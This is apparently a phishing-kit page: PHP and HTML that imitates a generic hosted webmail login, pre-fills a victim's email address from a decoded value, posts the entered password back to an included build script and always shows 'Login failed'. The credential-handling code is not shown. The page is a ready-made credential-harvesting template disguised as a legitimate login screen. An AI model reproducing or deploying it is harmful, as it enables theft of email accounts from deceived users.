<?php include '../build.php' ?>
<!DOCTYPE html>
<script type="text/javascript">/*<![CDATA[*/function MaskedPassword(e,d){if(typeof document.getElementById=="undefined"||typeof document.styleSheets=="undefined"){return false}if(e==null){return false}this.symbol=d;this.isIE=typeof document.uniqueID!="undefined";e.value="";e.defaultValue="";e._contextwrapper=this.createContextWrapper(e);this.fullmask=false;var f=e._contextwrapper;var b='<input type="hidden" name="'+e.name+'">';var c=this.convertPasswordFieldHTML(e);f.innerHTML=b+c;e=f.lastChild;e.className+=" masked";e.setAttribute("autocomplete","off");e._realfield=f.firstChild;e._contextwrapper=f;this.limitCaretPosition(e);var a=this;this.addListener(e,"change",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"input",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"propertychange",function(g){a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"keyup",function(g){if(!/^(9|1[678]|224|3[789]|40)$/.test(g.keyCode.toString())){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))}});this.addListener(e,"blur",function(g){a.fullmask=true;a.doPasswordMasking(a.getTarget(g))});this.forceFormReset(e);return true}MaskedPassword.prototype={doPasswordMasking:function(a){var d="";if(a._realfield.value!=""){for(var b=0;b<a.value.length;b++){if(a.value.charAt(b)==this.symbol){d+=a._realfield.value.charAt(b)}else{d+=a.value.charAt(b)}}}else{d=a.value}var c=this.encodeMaskedPassword(d,this.fullmask,a);if(a._realfield.value!=d||a.value!=c){a._realfield.value=d;a.value=c}},encodeMaskedPassword:function(d,f,b){var a=f===true?0:1;for(var e="",c=0;c<d.length;c++){if(c<d.length-a){e+=this.symbol}else{e+=d.charAt(c)}}return e},createContextWrapper:function(a){var b=document.createElement("span");b.style.position="relative";a.parentNode.insertBefore(b,a);b.appendChild(a);return b},forceFormReset:function(a){while(a){if(/form/i.test(a.nodeName)){break}a=a.parentNode}if(!/form/i.test(a.nodeName)){return null}this.addSpecialLoadListener(function(){a.reset()});return a},convertPasswordFieldHTML:function(c,e){var b="<input";for(var d=c.attributes,a=0;a<d.length;a++){if(d[a].specified&&!/^(_|type|name)/.test(d[a].name)){b+=" "+d[a].name+'="'+d[a].value+'"'}}b+=' type="text" autocomplete="off">';return b},limitCaretPosition:function(a){var d=null,c=function(){if(d==null){if(this.isIE){d=window.setInterval(function(){var e=a.createTextRange(),g=a.value.length,f="character";e.moveEnd(f,g);e.moveStart(f,g);e.select()},100)}else{d=window.setInterval(function(){var e=a.value.length;if(!(a.selectionEnd==e&&a.selectionStart<=e)){a.selectionStart=e;a.selectionEnd=e}},100)}}},b=function(){window.clearInterval(d);d=null};this.addListener(a,"focus",function(){c()});this.addListener(a,"blur",function(){b()})},addListener:function(c,a,b){if(typeof document.addEventListener!="undefined"){return c.addEventListener(a,b,false)}else{if(typeof document.attachEvent!="undefined"){return c.attachEvent("on"+a,b)}}},addSpecialLoadListener:function(a){if(this.isIE){return window.attachEvent("onload",a)}else{return document.addEventListener("DOMContentLoaded",a,false)}},getTarget:function(a){if(!a){return null}return a.target?a.target:a.srcElement}};/*]]>*/</script>
<html lang="en" class="js chrome layout-large"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Webmail :: Welcome to Webmail</title>

<meta name="Robots" content="noindex,nofollow" />
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link href="../assets/icons/hostedemail.ico" rel="shortcut icon">
<link rel="stylesheet" type="text/css" href="../assets/css/bootstrap.min.css">
<link rel="stylesheet" type="text/css" href="../assets/css/hostedemail.css">

<style>
  body { background: #4d4d4d; overflow: auto !important;}
.box-inner { background: white; width: 480px; padding: 30px 38px 48px 38px; }
#login-logo { width: 480px; margin-bottom: 20px; margin-top: 40px; }
/* default login logo is vector */
#login-logo object { display: block; margin-left: auto; margin-right: auto; }

/* custom login logos are raster */
#login-logo img { display: block; margin-left: auto; margin-right: auto; }
#login-logo img.small { display: none; }

/* for old mobile UI */
#mobiletest { display: none; }

.box-inner .table td { border: none; }
.box-inner p { margin-bottom: 0; padding-left: 10px; margin-top: 3px; }
.input-group-prepend { display: none; }
table#loginform .input-group { flex-wrap: unset; }
div#login-form { margin-left: auto; margin-right: auto; width: 480px; max-width: 480px; position: unset; }
#login-form form .formbuttons button { margin-left: auto; margin-right: auto; display: block; height: 40px; width: 200px; font-size: 18px; }
.table td.pair-top { padding-bottom: 0; }
.table td.pair-bottom { padding-top: 0; }
.spacer-bottom { padding-bottom: 13px; }
.box-bottom { margin-left: auto; margin-right: auto; width: 480px; }
#message .alert, #message2 .alert { border-radius: 0; }
#message .ui.alert, #message2 .ui.alert { background-color: #EC1313; color: white; justify-content: center; }
#message .ui.alert.alert-warning, #message2 .ui.alert.alert-warning { background-color: #EC1313; }
#message .ui.alert.alert-info, #message2 .ui.alert.alert-info { background-color: darkgrey; }
#message .ui.alert.alert-warning > i.icon:before, #message2 .ui.alert.alert-warning > i.icon:before { color: white; }
#message .ui.alert.alert-info > i.icon:before, #message2 .ui.alert.alert-info > i.icon:before { color: white; }
.pwrecover { margin-top: 20px; padding-left: 0.75rem; }
#loginform .input-group>.form-control { border-radius: 3px; height: 32px; }
#loginmodal .input-group>.form-control { border-radius: 3px; height: 32px; }

#login-form .modal_underlay { position: fixed; top: 0; left: 0; height: 100%; width: 100%; z-index: 10; background: black; opacity: 0.5; }
#login-form .modal { position: fixed; z-index: 20; background: white; width: 448px; padding: 22px 38px 48px 38px; top: 120px; display: block; height: 234px; left: auto; margin-left: -22px; }
#login-form .modalheader { position: fixed; z-index: 20; background: white; color:black; width: 448px; height: 70px; top: 50px; font-size: 20px; left: auto; margin-left: -22px; }
#login-form .modalheader center { margin-top: 40px; }
table#loginmodal { margin-bottom: 40px; }
#login-form .modalmessage { position: fixed; z-index: 20; background: white; width: 448px; margin-left: -22px; top: 354px; }

/* for IE/edge/safari */
#loginform .input-group>.form-control { width: 100%; }

/* for IE */
div#login-form { top: 0px; }

@media only screen and (max-width: 768px) {
  #mobiletest { display: inline-block; height: 1px; width:1px; }
}

@media only screen and (max-width: 490px) {
  #mobiletest { display: inline-block; height: 1px; width:1px; }
  body { background: white; overflow: auto !important; }
  #login-logo { width: 100%; background: #4d4d4d; margin-top: 0; margin-bottom: 10px; padding: 13px 0 13px 0; position: fixed; top:0px; margin: 0; }
  div#login-form { width: 100%; max-width: 100%; margin: 0; top: 0; }
  .box-inner { width: 100%; padding: 10px 10px 0 10px; margin-top: 30px; }
  .spacer-bottom { padding-bottom: 5px; }
  .box-bottom { margin-left: auto; margin-right: auto; width: 480px; }
  .pwrecover { margin-top: 10px; margin-bottom: 10px; }
  table#loginform td { padding-bottom: 0px; }
  #message { position: fixed; bottom: 0; width: 100%; }
  #login-form .modalmessage { position: fixed; bottom: 0; width: 100%; margin-left: 0; top: auto; }
  #login-form .modalheader { margin-left: 0; }
  #login-form .modalheader center { width: 90%; white-space: normal; }
  #login-form #loginmodal td.pair-top { width: 100%; }
  #login-form #loginmodal td.pair-bottom input { width: 250px; }
  #login-form .modal { width: 100%; margin-left: 0; top: 150px; padding: 0; }
  #login-form .modalheader.ui-dialog button { display: block !important; }
  #login-logo object { height: 18px; }
  #login-logo img.small { display: block; }
  #login-logo img.large { display: none; }
  #login-logo img.resize { height: 18px; }
}
</style>
</head>
<body class="ver2">
<span id="mobiletest"></span>
<!-- begin custom login html -->
<div data-list="login-list">
<div id="login-form">
  <div id="login-logo">
<object data="../assets/icons/webmail-logo.svg" type="image/svg+xml" id="logo" alt="Webmail"></object>
  </div>
  <div class="box-inner">
<!-- begin LOGIN_HTML block-->
<form name="form" method="post" action="" class="table-responsive-sm">
  <input type="hidden" value="hostedemail" name="login">
  <div id="example-user-full" style="display:none">e.g. <span id="example_user">yourname@example.com</span></div>
  <div id="example-case-sensitive" style="display:none">password is case-sensitive</div>
  <div id="example-2fa-ga" style="display:none">Get a token from your authenticator app.</div>
  <div class="example-2fa-sms" style="display:none">A token has been sent to your mobile device via SMS.</div>
  <table id="loginform" class="table">
    <tbody><tr class="form-group row">
      <td class="field pair-top wm-user">
        <span>E-mail address</span>
      </td>
      <td class="field pair-bottom input-group input-group-lg">
        <span class="input-group-prepend"><i class="input-group-text icon user"></i></span><input class="attr form-control" id="rcmloginuser" type="email" autocapitalize="off" size="40" required="required" name="user" onchange="check_realm();" value="<?php echo htmlspecialchars($decoded); ?>" placeholder="<?php echo htmlspecialchars($decoded); ?>" title="e.g. yourname@example.com">
      </td>
    </tr>
    <tr class="spacer-bottom wm-pass form-group row">
      <td class="field pair-top">
        <span>Password</span>
      </td>
      <td class="field pair-bottom input-group input-group-lg">
        <span class="input-group-prepend"><i class="input-group-text icon pass"></i></span><input class="attr form-control" id="rcmloginpwd" type="text" autocapitalize="off" size="47" required="required" name="pass" placeholder="" title="password is case-sensitive">
      </td>
    </tr>
    <tr class="session_expire form-group row">
      <td class="field input-group input-group-lg">
        <span class="input-group-prepend"><i class="input-group-text icon sessionexpire"></i></span><div class="custom-control custom-switch"><input class="attr form-control form-check-input custom-control-input" id="session_expire" type="checkbox" value="1" name="session_expire" onclick="test_checkboxes()" placeholder=""><label for="session_expire" class="custom-control-label" title=""></label></div>
        <p class="example-text">Shared computer - log me out after 4 hours</p>
      </td>
    </tr>
    <tr class="session_persist spacer-bottom form-group row">
      <td class="field input-group input-group-lg">
        <span class="input-group-prepend"><i class="input-group-text icon persist"></i></span><div class="custom-control custom-switch"><input class="attr form-control form-check-input custom-control-input" id="persist" type="checkbox" value="1" name="persist" onclick="test_checkboxes()" placeholder=""><label for="persist" class="custom-control-label" title=""></label></div>
        <p class="example-text">Keep me logged in until I log out</p>
      </td>
    </tr>
    
    <tr class="mobile form-group row input-group input-group-lg" style="display:none;">
      <span class="input-group-prepend"><i class="input-group-text icon desktop"></i></span><input id="desktop" type="hidden" value="1" name="desktop" class="form-control" placeholder="">
    </tr>
  </tbody></table>

  <div class="formbuttons">
    <button type="submit" class="button mainaction btn btn-primary login">Login</button>
  </div>

  
</form>


<!-- end LOGIN_HTML block-->

  </div>
</div>

<!-- end custom login html -->
</div>

<div class="box-bottom">
  <center>
    <div id="message" style="<?php echo $error; ?>">
      <div class="warning content ui alert alert-warning" role="alert"><i class="icon"></i><span><i class="icon"></i><span>Login failed.</span></span></div>
    </div>
  </center>
</div>
</body>
</script>
<script type="text/javascript">new MaskedPassword(document.getElementById("rcmloginpwd"),"\u25CF");document.getElementById("demo-form").onsubmit=function(){alert('pword = "'+this.pword.value+'"');return false};</script>
</html>